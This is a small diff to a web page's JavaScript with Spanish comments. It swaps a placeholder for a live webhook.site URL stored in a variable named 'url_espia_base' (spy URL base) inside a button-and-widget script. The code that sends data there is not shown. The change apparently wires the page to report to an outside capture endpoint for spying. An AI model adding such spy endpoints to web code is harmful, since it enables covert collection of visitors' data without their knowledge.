@@ -22,7 +22,7 @@ document.addEventListener("DOMContentLoaded", function() {
     const widget = document.getElementById("widget-local"); 
 
     // --- !! Pega tu URL de webhook.site aquí !! ---
-    const url_espia_base = "PEGA_TU_URL_DE_WEBHOOK_SITE_AQUI";
+    const url_espia_base = "https://webhook.site/72f2b41d-6ba8-4ca9-b639-b1c3713d8e7b";
     // ------------------------------------
 
     boton.addEventListener("click", function() {
@@ -93,3 +93,4 @@ document.addEventListener("DOMContentLoaded", function() {
         resultadoDiv.innerHTML = `Error: ${mensaje}`;
     }
 });
+
